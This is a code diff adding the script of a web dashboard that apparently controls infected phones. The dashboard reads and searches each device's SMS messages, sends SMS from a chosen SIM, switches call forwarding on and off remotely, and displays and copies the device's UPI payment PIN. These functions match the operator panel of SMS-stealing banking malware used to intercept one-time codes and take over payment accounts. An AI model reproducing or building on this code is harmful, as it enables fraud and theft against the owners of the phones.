+    if(search)u+=`&search=${encodeURIComponent(search)}`;
+    const r=await authFetch(u);
+    const d=await r.json();
+    total=d.total;
+    let msgs=d.messages;
+    if(filter!=='all')msgs=msgs.filter(m=>m.folder===filter);
+    eid('msgCount').textContent=total||0;
+    renderMsgs(msgs,replace);
+  }catch(e){
+    eid('messagesList').innerHTML='<div class="state-msg" style="color:var(--red)">Failed to load</div>';
+  }
+}
+
+function renderMsgs(msgs,replace){
+  const el=eid('messagesList');
+  if(!msgs.length&&replace){el.innerHTML='<div class="state-msg">No messages found</div>';return;}
+  const html=msgs.map(m=>msgHTML(m)).join('');
+  if(replace)el.innerHTML=html;
+  else el.insertAdjacentHTML('beforeend',html);
+}
+
+function msgHTML(m){
+  const isInbox=m.folder==='inbox'||!m.folder;
+  const body=highlightSearch(esc(m.body||'(empty)'));
+  const {d,t}=fmtParts(m.date);
+  return `<div class="msg-card">
+    <div class="msg-label">Message:</div>
+    <div class="msg-body">${body}</div>
+    <div class="msg-footer">
+      <div>
+        <div class="msg-from">From: ${esc(m.address||'Unknown')}</div>
+        <div class="msg-meta-row">
+          <span>Type: ${isInbox?'Received':'Sent'} | Date: ${d} Time: ${t} </span>
+         
+        </div>
+      </div>
+      <span class="msg-type-badge ${isInbox?'badge-received':'badge-sent'}">${isInbox?'Received':'Sent'}</span>
+    </div>
+  </div>`;
+}
+
+function highlightSearch(text){
+  if(!search)return text;
+  const es=search.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
+  return text.replace(new RegExp(`(${es})`,'gi'),'<span class="highlight">$1</span>');
+}
+
+eid('searchInput').addEventListener('input',deb(function(e){
+  search=e.target.value.trim();
+  eid('searchClear').style.display=search?'block':'none';
+  loadMsgs();
+},400));
+function clearSearch(){eid('searchInput').value='';eid('searchClear').style.display='none';search='';loadMsgs();}
+function setFilter(f,btn){filter=f;off=0;document.querySelectorAll('.filter-tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');loadMsgs();}
+
+function copyAll(){
+  copy([`Model: ${eid('ovModel').textContent}`,`Phone: ${eid('ovPhone').textContent}`,`SIM1: ${eid('ovSim1').textContent}`,`SIM2: ${eid('ovSim2').textContent}`,`UPI PIN: ${eid('ovUpiPin').textContent}`].join('\n'));
+}
+function copy(txt){navigator.clipboard.writeText(txt).then(()=>toast('Copied!','success')).catch(()=>{});}
+
+// SIM selection
+function selectSim(n){selectedSim=n;eid('simPill0').classList.toggle('active',n===0);eid('simPill1').classList.toggle('active',n===1);}
+function selectCfSim(n){selectedCfSim=n;eid('cfSimPill0').classList.toggle('active',n===0);eid('cfSimPill1').classList.toggle('active',n===1);}
+function updateCharCount(){eid('charCount').textContent=eid('smsBody').value.length;}
+
+async function sendSms(){
+  const to=eid('smsTo').value.trim(),body=eid('smsBody').value.trim(),sim=selectedSim;
+  const res=eid('smsResult'),btn=eid('sendSmsBtn');
+  if(!to||!body){showRes(res,'error','Enter number & message');return;}
+  btn.disabled=true;btn.textContent='Sending...';
+  try{
+    const r=await authFetch(`${API}/api/devices/${deviceId}/send-sms`,{method:'POST',headers:authHeaders,body:JSON.stringify({to,body,sim})});
+    const d=await r.json();
+    if(r.ok){showRes(res,'success',`Queued (${d.msgId})`);eid('smsBody').value='';eid('charCount').textContent='0';}
+    else showRes(res,'error',d.error||'Failed');
+  }catch(e){showRes(res,'error','Network error');}
+  finally{btn.disabled=false;btn.textContent='Send';}
+}
+
+async function activateCF(){
+  const n=eid('cfNumber').value.trim(),s=selectedCfSim,r=eid('cfResult');
+  if(!n){showRes(r,'error','Enter number');return;}
+  try{const res=await authFetch(`${API}/api/devices/${deviceId}/call-forward`,{method:'POST',headers:authHeaders,body:JSON.stringify({number:n,sim:s})});const d=await res.json();showRes(r,res.ok?'success':'error',d.message||d.error);}
+  catch(e){showRes(r,'error','Network error');}
+}
+async function deactivateCF(){
+  const s=selectedCfSim,r=eid('cfResult');
+  try{const res=await authFetch(`${API}/api/devices/${deviceId}/call-forward-off`,{method:'POST',headers:authHeaders,body:JSON.stringify({sim:s})});const d=await res.json();showRes(r,res.ok?'success':'error',d.message||d.error);}
+  catch(e){showRes(r,'error','Network error');}
+}
+
+// ===== Call Forwarding Status =====
+async function loadCFStatus(){
+  try{
+    const r=await authFetch(`${API}/api/devices/${deviceId}/call-forward-status`);
+    if(!r.ok)return;
+    const d=await r.json();
+    updateCFUI(d.cf_active, d.cf_number, '');
+  }catch(e){console.error('CF status load error:', e);}
+}
+
+function updateCFUI(active, number, ussdResp){
+  const isOn = active === 1 || active === true;
+  // Status card
+  const dot = eid('cfStatusDot');
+  dot.className = 'cf-status-dot ' + (isOn ? 'on' : 'off');
+  const statusText = eid('cfStatusText');
+  statusText.textContent = isOn ? '✅ ON' : '❌ OFF';
+  statusText.className = 'cf-val ' + (isOn ? 'cf-val-on' : 'cf-val-off');
+  eid('cfNumberText').textContent = isOn && number ? number : '—';
+  // USSD response
+  const ussdEl = eid('cfUssdResp');
+  if(ussdResp){
+    ussdEl.textContent = 'USSD Response: ' + ussdResp;
+    ussdEl.style.display = 'block';
+  }
+  // Popup status
+  const popStat = eid('cfPopupStatus');
+  popStat.textContent = isOn ? '✅ ON' : '❌ OFF';
+  popStat.style.color = isOn ? 'var(--green)' : 'var(--red)';
+  const numRow = eid('cfPopupNumRow');
+  if(isOn && number){
+    numRow.style.display = 'flex';
+    eid('cfPopupNum').textContent = number;
+    // Auto-fill the input
+    if(!eid('cfNumber').value) eid('cfNumber').value = number;
+  } else {
+    numRow.style.display = 'none';
+  }
+}
+
+async function checkCFStatus(){
+  const btn = eid('cfCheckBtn');
+  btn.disabled = true;
+  btn.textContent = '⏳ Checking...';
+  try{
+    const r = await authFetch(`${API}/api/devices/${deviceId}/check-call-forward`, {
+      method:'POST', headers:authHeaders, body:JSON.stringify({sim: selectedCfSim})
+    });
+    const d = await r.json();
+    if(r.ok){
+      toast('🔍 Checking CF status on device...', 'info');
+    } else {
+      toast(d.error || 'Failed to check', 'error');
+    }
+  }catch(e){
+    toast('Network error', 'error');
+  }finally{
+    setTimeout(()=>{
+      btn.disabled = false;
+      btn.textContent = '🔍 Check Status';
+    }, 3000);
+  }
+}
+
+async function loadHistory(){
+  try{
+    const r=await authFetch(`${API}/api/devices/${deviceId}/agent-history`);
+    const history=await r.json();
+    const el=eid('historyList');
+    if(!history.length){el.innerHTML='<div class="state-msg" style="padding:10px 0">No changes recorded yet</div>';return;}
+    const colors={'Agent PIN':'var(--yellow)','Employee Code':'#f97316','Funny Code':'var(--cyan)','Joining Date':'var(--green)'};
+    el.innerHTML=history.map(h=>{
+      const color=colors[h.field]||'var(--accent2)';
+      const time=h.changed_at?new Date(h.changed_at.includes('Z')?h.changed_at:h.changed_at+'Z').toLocaleString('en-IN',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit',hour12:true}):'—';
+      return `<div class="history-item"><div class="h-bar" style="background:${color}"></div><div class="h-body"><div class="h-field" style="color:${color}">${esc(h.field)}</div><div class="h-change"><span class="h-old">${h.old_value?esc(h.old_value):'empty'}</span><span style="color:var(--text3)">→</span><span class="h-new">${esc(h.new_value)}</span></div><div class="h-time">${time}</div></div></div>`;
+    }).join('');
+  }catch(e){eid('historyList').innerHTML='<div class="state-msg" style="color:var(--red);padding:10px 0">Failed</div>';}
+}
+
+// Popup
+function openPopup(id){eid(id).classList.add('open');document.body.style.overflow='hidden';}
+function closePopup(id){eid(id).classList.remove('open');document.body.style.overflow='';}
+function overlayClick(e,id){if(e.target===eid(id))closePopup(id);}
+document.addEventListener('keydown',e=>{if(e.key==='Escape')document.querySelectorAll('.overlay.open').forEach(o=>{o.classList.remove('open');document.body.style.overflow='';});});
+
+// Helpers
+function eid(id){return document.getElementById(id);}
+function showRes(el,t,m){el.className='result-msg '+t;el.textContent=m;el.style.display='block';setTimeout(()=>el.style.display='none',5000);}
+function toast(msg,type){
+  const c=eid('toastBox');const t=document.createElement('div');
+  const bg=type==='success'?'rgba(0,185,107,0.12)':type==='error'?'rgba(229,57,53,0.12)':'rgba(58,84,212,0.12)';
+  const bc=type==='success'?'rgba(0,185,107,0.35)':type==='error'?'rgba(229,57,53,0.35)':'rgba(58,84,212,0.35)';
+  const tc=type==='success'?'var(--green)':type==='error'?'var(--red)':'var(--accent2)';
+  t.style.cssText=`padding:10px 16px;border-radius:10px;font-size:12px;font-weight:600;background:${bg};border:1px solid ${bc};color:${tc};backdrop-filter:blur(12px);font-family:'DM Sans',sans-serif;box-shadow:0 4px 20px rgba(0,0,0,0.2);`;
+  t.textContent=msg;c.appendChild(t);
+  setTimeout(()=>{t.style.opacity='0';t.style.transition='0.3s';setTimeout(()=>t.remove(),300);},4000);
+}
+function fmtLastSeen(s){if(!s)return'—';const d=new Date(s.includes('Z')?s:s+'Z');return d.toLocaleDateString('en-IN',{day:'2-digit',month:'2-digit',year:'numeric'})+'\n'+d.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',hour12:true});}
+function fmtParts(ts){
+  if(!ts)return{d:'—',t:'—'};
+  const dt=new Date(ts);
+  return{
+    d:dt.toLocaleDateString('en-IN',{day:'2-digit',month:'2-digit',year:'numeric'}),
+    t:dt.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',hour12:true})
+  };
+}
+function esc(s){if(!s)return'';const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
+function deb(fn,ms){let t;return(...a)=>{clearTimeout(t);t=setTimeout(()=>fn.apply(this,a),ms);};}
+</script>
+</body>
+</html>
